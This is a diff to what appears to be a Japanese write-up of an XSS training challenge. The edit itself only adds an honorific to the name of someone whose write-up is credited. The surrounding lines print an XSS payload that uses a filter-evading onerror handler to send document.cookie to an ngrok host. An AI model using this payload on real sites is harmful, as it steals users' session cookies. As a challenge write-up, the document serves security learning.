@@ -69,7 +69,7 @@ scriptタグを埋め込みます。
 
 #### Stage10/Sanity Check
 いろいろできるんだけど、chromeのxssフィルターに引っかかりまくった…  
-hfukudaのwrite upをみて解けた。
+hfukudaさんのwrite upをみて解けた。
 ```
 /?q=<img%20src=x%20oscriptnerror=location.href="http://b5236666.ngrok.io?c="%2bdocument.cookie;>
 ```
